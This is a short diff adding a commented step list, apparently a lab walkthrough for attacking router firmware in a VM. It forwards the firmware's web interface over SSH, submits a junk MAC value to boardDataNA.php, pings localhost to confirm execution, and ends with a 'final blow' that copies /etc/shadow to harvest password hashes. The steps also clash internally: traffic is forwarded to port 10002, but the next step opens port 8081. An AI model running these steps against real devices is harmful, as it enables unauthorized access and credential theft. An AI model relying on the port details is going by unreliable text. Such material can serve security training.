@@ -1,0 +1,12 @@
+#Port forward the firmware on your local machine using: 
+ssh -N -v -v demo@<ip of vm> -L 10002:192.168.0.100:80
+
+#enter the password, then you should be able to access the login page on localhost:10002. Hit http://localhost:8081/boardDataNA.php on the browser
+
+#Enter a junk MAC value, submit the form, ping the localhost
+
+ping -c 10 127.0.0.1
+
+#open another prompt and fire up this command for the final blow
+
+cp /etc/shadow copy_password.txt
